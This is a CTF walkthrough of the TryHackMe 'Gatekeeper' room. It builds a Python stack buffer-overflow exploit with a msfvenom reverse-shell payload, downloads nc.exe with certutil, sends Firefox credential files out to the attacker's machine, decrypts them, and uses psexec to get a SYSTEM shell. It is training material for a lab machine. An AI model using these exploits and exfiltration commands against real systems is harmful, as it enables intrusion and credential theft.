---
title: "Walk-through of Gatekeeper from TryHackMe"
header:
  teaser: /assets/images/2021-03-20-11-40-39.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Buffer Overflow
  - Immunity
  - Mona
  - PSExec
  - Impacket
---

## Machine Information

![gatekeeper](/assets/images/2021-03-20-11-40-39.png)

Gatekeeper is rated as a medium difficulty room on TryHackMe. We start by finding something responding on an unusual port. Further investigation reveals an SMB share which we gain access to and download an executable. This turns out to be vulnerable to a buffer overflow, which we eventually use to exploit the version running on the target machine. On the target we find Firefox credentials that we retrieve, and then use with Impacket to gain a system level command shell.

<!--more-->
Skills required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit in Python. We also see how to use PSExec from Kali to remotely execute commands on Windows.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Gatekeeper](https://tryhackme.com/room/gatekeeper) |
| Machine Release Date | 19th May 2020 |
| Date I Completed It | 20th March 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
root@kali:/home/kali/thm/gatekeeper# ports=$(nmap -p- --min-rate=1000 -T4 10.10.245.39 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:/home/kali/thm/gatekeeper# nmap -p$ports -sC -sV -oA gatekeeper 10.10.245.39
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 22:12 GMT
Nmap scan report for 10.10.245.39
Host is up (0.078s latency).

PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49165/tcp open  msrpc       Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h19m55s, deviation: 2h18m34s, median: -5s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:89:2a:69:b9:8b (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-14T18:15:15-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-14T22:15:15
|_  start_date: 2021-03-14T22:10:43

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.63 seconds
```

From the scan we can see we're dealing with a Windows 7 Pro machine. There's a number of open ports, with smb worth investigating. There's also a service called Elite on port 31337 that needs looking at.

Let's check this strange service called Elite first, fire up netcat and see if we get a response:

```text
root@kali:/home/kali/thm/gatekeeper# nc -nvv 10.10.245.39 31337
(UNKNOWN) [10.10.245.39] 31337 (?) open
hello
Hello hello!!!
help
Hello help!!!
```

## SMB Enumeration

That service doesn't appear to do a lot at first glance. Let's look at SMB instead, the nmap scan showed us a user guest was authenticated so let's use that:

```text
root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H 10.10.245.39
[+] IP: 10.10.245.39:445        Name: 10.10.245.39                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Users                                                   READ ONLY
```

We see a share called Users, which we have read access to. Let's have a look in there:

```text
root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H 10.10.245.39 -r Users
[+] IP: 10.10.245.39:445        Name: 10.10.245.39                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\*
        dw--w--w--                0 Fri May 15 02:57:08 2020    .
        dw--w--w--                0 Fri May 15 02:57:08 2020    ..
        dw--w--w--                0 Sun Apr 19 20:51:00 2020    Default
        fr--r--r--              174 Wed Apr 22 04:18:13 2020    desktop.ini
        dr--r--r--                0 Fri May 15 02:58:07 2020    Share
```

We see a folder in there called Share, let's have a look in there:

```text
root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H 10.10.245.39 -r Users/Share
[+] IP: 10.10.245.39:445        Name: 10.10.245.39                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\UsersShare\*
        dr--r--r--                0 Fri May 15 02:58:07 2020    .
        dr--r--r--                0 Fri May 15 02:58:07 2020    ..
        fr--r--r--            13312 Fri May 15 02:58:07 2020    gatekeeper.exe
```

We have a file called gatekeeper.exe, let's grab it and have a look:

```text
root@kali:/home/kali/thm/gatekeeper# smbmap -u guest -H 10.10.245.39 -r Users/Share -A 'gate'
[+] IP: 10.10.245.39:445        Name: 10.10.245.39                                      
[+] Starting search for files matching 'gate' on share Users.
[+] Match found! Downloading: UsersShare\gatekeeper.exe
```

Let's check the file:

```text
root@kali:/home/kali/thm/gatekeeper# file 10.10.245.39-UsersShare_gatekeeper.exe 
10.10.245.39-UsersShare_gatekeeper.exe: PE32 executable (console) Intel 80386, for MS Windows
```

## Transfer File

A Windows 32bit executable, let's pull it over to a 32bit Win10 VM where I have Immunity installed. Start a webserver on Kali:

```text
root@kali:/home/kali/thm/gatekeeper# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Log on to my Win10 VM and browse to get the file:

![gatekeeper-webserver](/assets/images/2021-03-14-22-41-18.png)

Trying to run the executable on my Win10 VM I get this error message:

![gatekeeper-vcredist](/assets/images/2021-03-14-22-51-03.png)

A quick Google leads me to [this](https://www.microsoft.com/en-us/download/details.aspx?id=52685) file, which I download and install.

Now when I run the exe we see this:

```text
[+] Listening for connections.
```

Switching to Kali and attempting to connect to my Win10 VM:

```text
root@kali:/home/kali/thm/gatekeeper# nc 192.168.0.11 31337
help
Hello help!!!
hello
Hello hello!!!
```

Looks to be the same as we connected to earlier. So now we start to look at a way to exploit it.

First go back to Win10. Start Immunity as administrator, open the gatekeeper app, then press F9 to start it running:

![gatekeeper-immunity](/assets/images/2021-03-16-22-49-15.png)

## Fuzzing

Now let's use a script to see if we can cause a buffer overflow:

```text
import socket, time, sys

ip = "192.168.0.11"
port = 31337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        print("Fuzzing with %s bytes" % len(string))
        s.send(string + "\r\n")
        data = s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Here we start by sending the letter A 100 times which is a way of sending 100 bytes. We could have chosen any ASCII character. If we get a response we increase by 100, and send again. The script repeats until there isn't a response, which we assume means the gatekeeper application has crashed.

Start the script on Kali:

```text
root@kali:/home/kali/thm/gatekeeper# python fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Could not connect to 192.168.0.11:31337
```

After sending 200 bytes we can't connect. Switch to Win10 to see what the app is doing:

![gatekeeper-app-crash](/assets/images/2021-03-16-22-50-29.png)

We can see our connection, and the first response. Then a second connection which shows it failed to send a response. Looking in Immunity we see there is an access violation, and the app is paused:

![gatekeeper-app-paused](/assets/images/2021-03-16-22-53-01.png)

So it looks like 200 bytes is enough to cause an overflow. Let's create a unique pattern using Mona, so we can find the exact number required:

```text
!mona pattern_create 200
```

A file called pattern.txt will be created with our pattern, open it and copy the line of characters under the ASCII heading:

![gatekeeper-pattern](/assets/images/2021-03-16-22-57-06.png)

Restart the gatekeeper app in Immunity, make sure you press F9 so it's running.

## Finding Overflow Value

Now we need to create script to exploit the overflow and try to get ourselves a reverse shell. Here's one I've used before:

```text
import socket

ip = "192.168.0.11"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab <SNIP>"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

For now this script is just sending the unique pattern from Mona which I've pasted in to the payload section. Let's run it:

```text
root@kali:/home/kali/thm/gatekeeper# python exploit.py 
Sending evil buffer...
Done!
```

Now switch to Immunity, use Mona to find how many bytes were needed to crash the app:

```text
!mona findmsp -distance 200
```

Look at the Log to see the result from Mona:

![gatekeeper-mona-distance](/assets/images/2021-03-16-23-08-24.png)

## Controlling EIP

From the output we can see that EIP was at an offset of 146. Let's verify we can fill EIP by placing four B's on it. Make a slight adjustment to our script:

```text
prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload =""
postfix = ""
```

Above we've set the offset to 146 as we know that will fill the buffer. We then set retn to BBBB, this should fill EIP with our bytes.

Restart gatekeeper using Immunity, remember to press F9 to set it running. Switch back to Kali and run our exploit script, then back to Immunity to check EIP:

![gatekeeper-bbbb](/assets/images/2021-03-17-22-01-01.png)

We can see we have control of EIP because it contains 42424242 which is ASCII for BBBB which we just sent. Eventually we'll be putting the address of the ESP in there to cause the program to jump to our shellcode.

## Finding Bad Characters

First we need to check for bad characters. We use Mona to create our initial list:

```text
!mona bytearray -b "\x00"
```

You can see in the output it lists all of the possible ASCII characters:

![gatekeeper-bytearray](/assets/images/2021-03-17-22-06-01.png)

There is a text file generated, which we can use to copy the ASCII code out of to place in our script:

![gatekeeper-byte-text](/assets/images/2021-03-17-22-09-45.png)

Paste in to the payload section:

```text
prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
postfix = ""
```

Now restart gatekeeper in Immunity and set it running, switch to Kali and run our script, then back to Immunity to check for bad characters. First find the address of ESP:

![gatekeeper-esp](/assets/images/2021-03-17-22-13-16.png)

Now use Mona to compare the contents of memory starting at the address in ESP with the bytearray.bin file we created earlier:

```text
!mona compare -f bytearray.bin -a 008519F0
```

It compares the bytes in the file with those in memory, then suggests possible bad characters:

![gatekeeper-compare](/assets/images/2021-03-17-22-18-38.png)

From this we see 0a is another possible one as well as 00 which we had already excluded. We now create a new bytearray file with Mona:

```text
!mona bytearray -b "\x00\x0a"
```

Output looks like this:

![gatekeeper-oa-excluded](/assets/images/2021-03-17-22-23-43.png)

Also remove 0a from our exploit script:

```text
prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
postfix = ""
```

Restart gatekeeper in Immunity and set it running, switch to Kali and run the exploit, then back to Immunity and use Mona to do another check. Check value of ESP, then use the same command as before:

```text
!mona compare -f bytearray.bin -a 008A19F0
```

![gatekeeper-compare-complete](/assets/images/2021-03-17-22-45-04.png)

This time we see the shellcode is unmodified which means we have no more bad characters to find.

## Finding ESP

Next job is to find JMP ESP, this is our entry point for executing our shellcode. We put this address in EIP then when we overwrite the buffer the program flow follows it to ESP where our shellcode is lined up.

We can use Mona to find the address of ESP:

```text
!mona jmp -r esp -cpb "\x00\x0a"
```

Here we are saying search memory for any program that has JMP ESP and excludes our known bad characters. As you would expect the gatekeeper.exe we have been exploiting contains what we need:

![gatekeeper-jmp-esp](/assets/images/2021-03-17-22-50-15.png)

We need to convert the address from HEX to Little Endian:

```text
080414C3 <--> \xc3\x14\x04\x08
```

## Generate Payload

Our final task is to create our payload. For this we can use MSFVenom:

```text
root@kali:/home/kali/thm/gatekeeper# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=1234 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xdb\xce\xba\xb5\xcc\xb7\x15\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
<SNIP>
"\x80\x8b\x18\xed\xa1\x99";
```

## Assemble Script

Now we have everything needed for our script, so let's put it together:

```text
prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = (
"\xdb\xce\xba\xb5\xcc\xb7\x15\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
<SNIP>
"\x80\x8b\x18\xed\xa1\x99"
)
postfix = ""
```

Just to confirm what we have:

```text
offset = number of bytes we send to fill buffer
retn = memory address of ESP
padding = NOP Sled added to ensure we hit our payload
payload = shellcode created by MSFVenom
```

Now we start a netcat session listening in another terminal on Kali, run our exploit, we should see we are connected to a reverse shell:

```text
root@kali:/home/kali/thm/gatekeeper# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.19] from (UNKNOWN) [192.168.0.11] 51219
Microsoft Windows [Version 10.0.17134.112]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Administrator\Desktop>
```

## Exploiting Target

We've successfully exploited the gatekeeper.exe on our local machine. Now it's time to use our script against the one hosted on TryHackMe.

First create a new payload with MSFVenom, use our TUN0 IP which connects us to the TryHackMe network over VPN:

```text
root@kali:/home/kali/thm/gatekeeper# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.165.116 LPORT=1234 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
```

Update our exploit script with the IP of the TryHackMe machine and this new payload:

```text
ip = "10.10.245.39"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = (
"\xda\xc7\xd9\x74\x24\xf4\xbb\xc3\x46\xfc\x15\x58\x29\xc9\xb1"
<SNIP>
"\x62\x1a\x47\xc6\xe0\xae\x38\x3d\xf8\xdb\x3d\x79\xbe\x30\x4c"
"\x12\x2b\x36\xe3\x13\x7e"
)
postfix = ""
```

Switch to our Kali netcat session waiting to see our reverse shell is connected:

```text
root@kali:/home/kali/thm/gatekeeper# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.165.116] from (UNKNOWN) [10.10.245.39] 49194
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>
```

## Initial Access

Let's see what rights we have:

```text
C:\Users\natbat\Desktop> whoami /all

USER INFORMATION
----------------

User Name         SID                                          
================= =============================================
gatekeeper\natbat S-1-5-21-663372427-3699997616-3390412905-1003

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes                                        
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
GATEKEEPER\HomeUsers                   Alias            S-1-5-21-663372427-3699997616-3390412905-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## User Flag

Ok, I'm just a user. Let's have a look around:

```text
C:\Users\natbat\Desktop>dir

 Directory of C:\Users\natbat\Desktop

04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
```

We have the user flag, let's grab that:

```text
C:\Users\natbat\Desktop>type user.txt.txt
<<HIDDEN>>

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```

## Firefox Credentials

This is a CTF so seeing a file related to Firefox is immediately suspicious. Retrieving credentials from browser caches is a well known path for lateral movement or escalation. A quick Google found [this](https://github.com/lclevy/firepwd) python script to pull passwords out of the files held in the users profile. Following the example I find this folder:

```text
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
05/14/2020  10:30 PM                24 addons.json
05/14/2020  10:23 PM             1,952 addonStartup.json.lz4
05/14/2020  10:45 PM                 0 AlternateServices.txt
05/14/2020  10:30 PM    <DIR>          bookmarkbackups
05/14/2020  10:24 PM               216 broadcast-listeners.json
04/22/2020  12:47 AM           229,376 cert9.db
04/21/2020  05:00 PM               220 compatibility.ini
04/21/2020  05:00 PM               939 containers.json
04/21/2020  05:00 PM           229,376 content-prefs.sqlite
05/14/2020  10:45 PM           524,288 cookies.sqlite
<SNIP>
           33 File(s)     12,300,786 bytes
              14 Dir(s)  16,293,216,256 bytes free
```

Reading how firepwd works, I just need to grab the addons.json and cert9.db files. To get them over to Kali I need to first copy netcat across to Windows. Grab the 32bit exe of netcat and start a webserver:

```text
root@kali:/home/kali/thm/gatekeeper# wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
--2021-03-18 21:55:38--  https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
Resolving eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
Connecting to eternallybored.org (eternallybored.org)|84.255.206.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 111892 (109K) [application/zip]
Saving to: ‘netcat-win32-1.12.zip’

netcat-win32-1.12.zip                                 100%[============================================

2021-03-18 21:55:38 (628 KB/s) - ‘netcat-win32-1.12.zip’ saved [111892/111892]

root@kali:/home/kali/thm/gatekeeper# unzip netcat-win32-1.12.zip 
Archive:  netcat-win32-1.12.zip
  inflating: doexec.c                
  inflating: getopt.c                
  inflating: netcat.c                
  inflating: generic.h               
  inflating: getopt.h                
  inflating: hobbit.txt              
  inflating: license.txt             
  inflating: readme.txt              
  inflating: Makefile                
  inflating: nc.exe                  
  inflating: nc64.exe                

root@kali:/home/kali/thm/gatekeeper# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now switch to our shell on the Windows machine and pull nc.exe across:

```text
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>certutil -urlcache -f http://10.8.165.116:8000/nc.exe nc.exe
certutil -urlcache -f http://10.8.165.116:8000/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Now start another netcat session running on Kali ready to receive the first file:

```text
root@kali:/home/kali/thm/gatekeeper# nc -nlvp 4444 > key4.db
listening on [any] 4444 ...
```

Over on Windows use nc.exe to send the file:

```text
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>nc -nv 10.8.165.116 4444 < key4.db  
nc -nv 10.8.165.116 4444 < key4.db
```

Do the same for the other file:

```text
root@kali:/home/kali/thm/gatekeeper# nc -nlvp 4444 > logins.json
listening on [any] 4444 ...
```

```text
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>nc -nv 10.8.165.116 4444 < logins.json
nc -nv 10.8.165.116 4444 < logins.json
```

Get the firepwd script:

```text
root@kali:/home/kali/thm/gatekeeper# git clone https://github.com/lclevy/firepwd.git
Cloning into 'firepwd'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 88 (delta 2), reused 1 (delta 0), pack-reused 80
Receiving objects: 100% (88/88), 238.50 KiB | 2.00 MiB/s, done.
Resolving deltas: 100% (41/41), done.
```

Install requirements:

```text
root@kali:/home/kali/thm/gatekeeper# mv key4.db firepwd/
root@kali:/home/kali/thm/gatekeeper# mv logins.json firepwd/
root@kali:/home/kali/thm/gatekeeper# cd firepwd/

root@kali:/home/kali/thm/gatekeeper/firepwd# pip install -r requirements.txt
Collecting PyCryptodome>=3.9.0
Downloading pycryptodome-3.10.1-cp35-abi3-manylinux2010_x86_64.whl (1.9 MB)
 |████████████████████████████████| 1.9 MB 3.4 MB/s
Requirement already satisfied: pyasn1>=0.4.8 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (0.4.8)
Installing collected packages: PyCryptodome
Successfully installed PyCryptodome-3.10.1
```

Now run the script:

```text
root@kali:/home/kali/thm/gatekeeper/firepwd# python3 firepwd.py
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
<SNIP>
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'<<HIDDEN>>'
```

Excellent we have a user and password. Now we can try to use PSExec to start a remote command prompt using those credentials:

## Impacket

```text
kali@kali:~/thm/gatekeeper$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:<<HIDDEN>>@10.10.245.39 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.245.39.....
[*] Found writable share ADMIN$
[*] Uploading file VQGNrSNN.exe
[*] Opening SVCManager on 10.10.245.39.....
[*] Creating service gWHz on 10.10.245.39.....
[*] Starting service gWHz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Root Flag

It worked! Who are we:

```text
c:\Users\mayor\Desktop>whoami
nt authority\system
```

 Made it. Let's grab the root flag:

```text
C:\Windows\system32>cd c:\users\mayor\desktop
c:\Users\mayor\Desktop>dir

 Directory of c:\Users\mayor\Desktop
05/14/2020  09:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  16,283,815,936 bytes free

c:\Users\mayor\Desktop>type root.txt.txt
<<HIDDEN>>
```

All done. See you next time.
